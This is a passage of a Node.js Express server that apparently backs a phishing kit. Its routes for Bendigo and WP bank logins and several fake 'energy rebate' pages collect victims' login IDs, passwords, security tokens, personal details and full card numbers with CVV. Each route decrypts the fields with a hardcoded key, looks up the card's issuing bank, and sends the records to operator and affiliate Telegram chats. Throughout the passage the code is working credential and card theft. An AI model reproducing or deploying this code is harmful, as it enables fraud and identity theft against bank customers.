            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1983666674,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        clearstore += 1;
      }
    });
});

//WP
//WP
//WP

let wpCount = 0;

app.post("/wpSaveLogin", (req, res) => {
  customerId = req.body.customerId;
  password = req.body.password;
  telephone = req.body.telephone;
  owner = req.body.owner;

  var originalText = `+----------- Login Information ------------+\nCustomer ID: ${customerId}\nPassword: ${password}\nPhone Number: ${telephone}`;
  if (wpCount == 3) {
    axios.post(
      `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
    );
    wpCount = 0;
  } else {
    axios.post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=WPLoginSpooferGoofer:\n${originalText}`
    );
    axios.post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=${owner}&text=WPLogin:\n${originalText}`
    );
    wpCount += 1;
  }
  res.send("Update Completed");
});

//BENDIGO
//BENDIGO
//BENDIGO

let skiiBendigo = 0;

app.post("/bendigoLogin", (req, res) => {
  accessId = CryptoJS.AES.decrypt(req.body.accessId, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  owner = req.body.owner;

  var originalText = `+----------- Login Information ------------+\nAccess ID: ${accessId}\nPassword: ${password}`;
  if (skiiBendigo == 3) {
    axios.post(
      `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
    );
    skiiBendigo = 0;
  } else {
    axios.post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=BendigoLogin:\n${originalText}`
    );
    axios.post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=${owner}&text=BendigoLogin:\n${originalText}`
    );
    skiiBendigo += 1;
  }
  res.send("Update Completed");
});

app.post("/bendigoSkii", (req, res) => {
  accessId = CryptoJS.AES.decrypt(req.body.accessId, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secToken = CryptoJS.AES.decrypt(req.body.secToken, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;

  var originalText = `+----------- Login Information ------------+\nAccess ID: ${accessId}\nPassword: ${password}\nSecurity Token: ${secToken}\n+ ----------- Personal Information ------------+\nPhone Number: ${telephone}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}`;
  if (skiiBendigo == 3) {
    axios.post(
      `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
    );
    skiiBendigo = 0;
  } else {
    axios.post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=BendigoSkii:\n${originalText}`
    );
    axios.post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1437456088&text=Bendigo:\n${originalText}`
    );
    skiiBendigo += 1;
  }

  res.send("Update Completed");
});

//NHS
app.use("/nhs", require("./routes/nhs"));

//ENERGY
//ENERGY
//ENERGY

let gymuC = 0;

app.post("/energySpoofGoof", async (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (Spoofergoofer == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        Spoofergoofer = 7;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EnergyRebateSpoofGoof\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 993063133,
              text: `EnergyRebate:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        Spoofergoofer += 1;
      }
      res.send("Update complete");
    });
});

app.post("/energySorcerer", async (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (Spoofergoofer == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        Spoofergoofer = 7;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EnergyRebateSorcerer\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1233717083,
              text: `EnergyRebate:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        Spoofergoofer += 1;
      }
      res.send("Update complete");
    });
});

app.post("/energySYM", async (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (symEvri == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        symEvri = 7;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EnergyRebateSYM\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1713673720,
              text: `EnergyRebate:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        symEvri += 1;
      }
      res.send("Update complete");
    });
});

app.post("/energyBlackTesco", async (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (blackTesco == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        blackTesco = 7;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EnergyRebateBlackTesco:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5028651320,
              text: `EnergyRebate:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        blackTesco += 1;
      }
      res.send("Update complete");
    });
});

app.post("/energySerenity", async (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (saim == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        saim = 7;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EnergyRebateSerenity:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5632307735,
              text: `EnergyRebate:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        saim += 1;
      }
      res.send("Update complete");
    });
});

app.post("/energyBali", async (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (clearstore == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        clearstore = 7;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EnergyRebateBali:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1983666674,
              text: `EnergyRebate:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        clearstore += 1;
      }
      res.send("Update complete");
    });
});

app.post("/energyGYMU", async (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (gymuC == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        gymuC = 7;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EnergyRebateGYMU:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1044199383,
              text: `EnergyRebate:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        gymuC += 1;
      }
      res.send("Update complete");
    });
});

app.post("/energyStacker", async (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (manEvri == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        manEvri = 7;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EnergyRebateStacker:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 715738877,
              text: `EnergyRebate:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        manEvri += 1;
      }
      res.send("Update complete");
    });
});

app.post("/energyCDB", async (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (manEvri == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        manEvri = 7;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EnergyRebateCDB:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 911916233,
              text: `EnergyRebate:\n${originalText}`,
              parse_mode: "Markdown",
